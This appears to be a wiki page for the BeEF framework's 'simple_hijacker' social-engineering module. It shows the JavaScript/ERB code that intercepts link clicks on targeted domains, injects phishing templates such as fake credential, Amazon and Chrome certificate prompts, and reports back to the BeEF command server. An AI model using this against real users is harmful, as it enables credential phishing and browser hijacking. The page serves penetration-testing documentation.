##Summary
* **Objective**: Hijack clicks on links to display what you want.
* **Authors**: gallypette
* **Browsers**: All (user notified)
* **Parameters** :
  * **targeted domains** : Only links including one of this domain will be targeted (domains are separated by a comma)
  * **Template to use** : List of template for social engineering attacks : credential, confirmbox, amazon, chromecertbeggar, chromecertbeggar2
* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/simple_hijacker)

## Internal working

Basically, this module will take any link in the page, check if it target one of the domains given and load the template when the link is clicked.

```javascript
    $j('a').click(function(e) {
      e.preventDefault();
      if ($j(this).attr('href') != '')
      {
        if( <% target.each{ |href| %> $j(this).attr('href').indexOf("<%=href%>") != -1 <% if href != target.last %> || <% else %> ) <% end %><% } %>{	
          <%
              tplpath = "#{$root_dir}/modules/social_engineering/simple_hijacker/templates/#{@choosetmpl}.js"
              file = File.open(tplpath, "r")
              @template = file.read
          %>
          <%= @template %>
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Template "<%= @choosetmpl %>" applied to '+$j(this).attr('href'));
        }
      }
    });
```

## Screenshots 

_Command_ :
[[Images/module-simplehijacker1.png|align=center]]

_Amazon template_ :
[[Images/module-simplehijacker2.png|align=center]]

_Confirmbox :_ :
[[Images/module-simplehijacker3.png|align=center]]

_Chrome Cert 1:_ :
[[Images/module-simplehijacker4.png|align=center]]

_Chrome Cert 2:_ :
[[Images/module-simplehijacker5.png|align=center]]

## Feedbacks

* Domains are really important as the name should be included in the link. Links which are not included in this domain's list will not redirect to the correct URL anymore.